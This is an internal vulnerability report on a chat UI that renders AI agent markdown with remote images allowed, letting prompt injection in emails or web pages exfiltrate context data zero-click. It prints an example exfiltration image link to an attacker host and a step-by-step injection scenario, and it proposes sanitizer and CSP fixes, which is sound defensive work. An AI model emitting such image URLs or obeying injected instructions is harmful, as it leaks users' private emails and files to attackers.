# Cockpit renders agent markdown with remote `<img>` allowed — a zero-click data-exfiltration channel for prompt injection

**Status:** **DIAGNOSED via code audit + industry precedent, 2026-07-15. Not yet browser-reproduced; no fix yet.** The render path, the permissive sanitizer posture, and the absence of an `img-src` CSP are all confirmed in code (refs below). A 2-minute empirical probe (below) will confirm the live zero-click fetch — but the fix is warranted either way (defense-in-depth against a well-documented attack class).
**Found:** 2026-07-15, during the email-datasource research pass ([[project-email-datasource]] / `docs/features/email_datasource.md` "Security posture"). This is a **pre-existing, feature-independent platform vulnerability** — it exists today for any untrusted content the agent already ingests (web_search results, repo files, tool output). The email datasource does not create it; it makes it **acute** by adding the canonical injection source (an attacker-controlled inbox).
**Severity:** **High.** Zero-click exfiltration of anything in the agent's context window (other emails, datasource rows, repo/workspace files, KB/memory) to an attacker-controlled URL, triggered by a prompt injection in any untrusted content the agent summarizes or quotes. No user interaction beyond viewing the agent's reply. This is the exact mechanism behind Microsoft 365 Copilot **EchoLeak** (CVE-2025-32711), ChatGPT **ShadowLeak**, and **Superhuman AI** (Jan 2026) — the product this project is named after.
**Component:** cockpit Angular · `cockpit/src/app/app.config.ts:95-116` (`provideMarkdown()`) · `cockpit/src/app/views/persistent-chat/persistent-chat.component.ts:807,862,965,1007,1024` (`<markdown [data]=…>` render sites) · `docker/cockpit-nginx.conf:9` + `cockpit/angular.json:113` (app CSP = `frame-ancestors 'none'` only) · **in-repo fix precedent:** `cockpit/src/app/views/canvas/canvas-rendering.ts:1,47,400,508` (DOMPurify + strict CSP)
**Related:** [[project-email-datasource]] (the doc that flagged this; its P0 "output-side egress control") · the draft-sanitization sibling concern (an agent-composed draft body with a tracking pixel fires when the user opens it to review — same channel, mail-client side)

## Summary

The cockpit renders assistant/agent message content as markdown via `ngx-markdown`, which relies on Angular's default `DomSanitizer`. That sanitizer strips scripts and event handlers but **permits `<img src="https://…">`**. Agent output is untrusted the moment the agent has read any untrusted input (an email body, a web page, a repo file). So an injected instruction that makes the model emit:

```markdown
![](https://attacker.example/x?d=<base64 of secrets the agent just read>)
```

renders an `<img>` whose `src` the browser **auto-fetches with zero clicks**, delivering the exfiltrated data in the URL. The app ships no `img-src`/`connect-src` Content-Security-Policy to stop the fetch (the only CSP is `frame-ancestors 'none'`, which addresses clickjacking, not egress).

This is the completing leg of the **lethal trifecta** (private data + untrusted content + external communication): tier gating, folder allowlists, and "draft-not-send" defenses in the email design are all orthogonal to it — read access plus a rendering surface is already a full exfil path.

## The vulnerability, in code

**1. Untrusted agent content is rendered as markdown.** Every assistant turn, summary, and answer flows through `<markdown [data]=…>`:

```
cockpit/src/app/views/persistent-chat/persistent-chat.component.ts
  807:  <markdown appCitationRef appKatex [data]="event.content" …>
  862:  <markdown appKatex [data]="turn.summary"></markdown>
  965:  <markdown appCitationRef appKatex [data]="answer" …>
 1007:  <markdown appCitationRef appKatex [data]="group.event.content" …>
```

**2. No image handling / sanitization is configured.** `provideMarkdown()` sets only gfm/breaks + the citation and KaTeX extensions — no DOMPurify, no image stripping, no `sanitize` override:

```
cockpit/src/app/app.config.ts:95-116  provideMarkdown({ markedOptions:{gfm,breaks}, markedExtensions:[citation, math] })
```

ngx-markdown defaults to Angular's `DomSanitizer` at `SecurityContext.HTML`, which **allows `<img>` with an arbitrary remote `src`** (it is not in the script/handler blocklist). Reference-style and inline markdown images both produce a live `<img>`.

**3. No CSP stops the outbound fetch.** The only Content-Security-Policy the cockpit serves is anti-framing:

```
docker/cockpit-nginx.conf:9   add_header Content-Security-Policy "frame-ancestors 'none'" always;
cockpit/angular.json:113       "Content-Security-Policy": "frame-ancestors 'none'"
```

There is no `img-src` / `connect-src` / `default-src` directive, so `https://attacker/...` loads unimpeded. A domain allowlist would **not** be sufficient anyway — Superhuman's exfil went through an *allowlisted* `docs.google.com` (Google Forms accepts arbitrary data via GET).

**4. The fix pattern already exists in this repo — applied to canvas, not chat.** The canvas renderer treats its rendered content as hostile and locks egress down completely:

```
cockpit/src/app/views/canvas/canvas-rendering.ts
   1:  import DOMPurify from 'dompurify';
  47:  "img-src 'none'; font-src 'none'; connect-src 'none'; form-action 'none'; " …   (STATIC_HTML_CSP)
 400:  DOMPurify.sanitize(parsed, {…})
 508:  DOMPurify.sanitize(source, {…})
cockpit/src/app/views/canvas/canvas-live-app-renderer.component.ts:124
        this.sanitizer.sanitize(SecurityContext.RESOURCE_URL, src)
```

The team already knows how to neutralize external-resource loading in untrusted rendered content. The gap is that the **chat/message markdown path — which renders the *actual* untrusted agent output — has none of it.**

## Why the email tiers don't save us

`docs/features/email_datasource.md` (Security posture) covers this in depth. In short: gating `send`, defaulting to `draft`, and the folder allowlist all constrain *email actions*; none touch the *rendered-output* channel. The moment the agent reads an injected body at the `read` tier and summarizes it into a reply the cockpit renders, the data is gone — no send required. (The mail-client-side sibling: an agent-composed **draft** body carrying a tracking pixel fires when the user opens the draft to review it, before any send. That's addressed separately by draft sanitization in the email doc.)

## Attack scenario (concrete)

1. Attacker emails the user; the body carries a hidden injection (white-on-white text / `display:none` / a reference-style markdown image template).
2. The user moves the mail into their `AI` folder (or an autonomous loop reads it) and asks the agent to "summarize my recent mail."
3. The injection instructs the model to base64 the content of the other messages it read and emit a markdown image `![](https://attacker/collect?d=<data>)`.
4. The cockpit renders the reply; the browser fetches the URL **zero-click**; the attacker's endpoint logs the query string. Done.

The same works **today**, pre-email, with any untrusted content the agent ingests (a web_search result page, a poisoned repo README). Email just guarantees a steady supply of attacker-controlled input.

## Proposed fix

Two complementary layers; do both.

- **Render path (primary):** stop the chat/message markdown renderer from emitting live remote resources. Options, in rough order of preference:
  1. A `marked` extension / post-render pass that **drops or neutralizes external image `src`** (and reference-style images) in agent output — e.g. rewrite to a click-to-load placeholder, or strip entirely. Reuse the canvas **DOMPurify** approach (`canvas-rendering.ts`) with an image-hostile config so there is one sanitization story in the codebase.
  2. Keep genuinely-needed images (if any — citations/math don't need remote `<img>`) behind an explicit click-to-load proxy; default-deny.
- **Platform (defense-in-depth):** add an **`img-src`/`connect-src` Content-Security-Policy** to the cockpit document (extend `docker/cockpit-nginx.conf:9` and `angular.json:113` beyond `frame-ancestors`). Even a permissive-but-bounded `img-src 'self' data:` blocks arbitrary remote fetches from rendered markdown while leaving app assets working. This is the backstop that catches any render-path miss (and any future new render surface).

Both are informed by the production fixes that actually stopped EchoLeak-class attacks (Google: "identifies external image URLs and will not render them"; Microsoft: link/image redaction + CSP hardening).

Related hardening tracked in the email doc, not here: draft-body sanitization before IMAP `APPEND`, and the approval/preview UI rendering previews with images blocked + URLs expanded.

## Verification

- **Confirm the live hole (2 minutes):** have an agent emit `![](https://<your-collaborator-or-logging-endpoint>/probe)` in a reply (or paste it into a rendered markdown surface) and watch for the inbound hit in DevTools Network / the collaborator log. A hit confirms zero-click fetch; the fix must make it stop.
- **Post-fix:** the same probe produces **no** outbound request (render path strips it) and/or is **blocked by CSP** (console `Refused to load the image … violates the Content Security Policy directive "img-src …"`). Add a cockpit unit/e2e test asserting a remote `<img>` in agent markdown does not load, mirroring the canvas conformance tests (`cockpit/e2e/canvas/canvas-conformance.spec.ts`).

## Scope / priority

Independent of the email datasource and worth fixing on its own merits — it protects every existing untrusted-content path (web_search, repo, tool output). It is a **hard prerequisite for the email draft/send tiers** but the email **read tier can ship alongside** it. Recommend prioritizing the platform CSP (cheap, broad) immediately and the render-path sanitization as the durable fix.
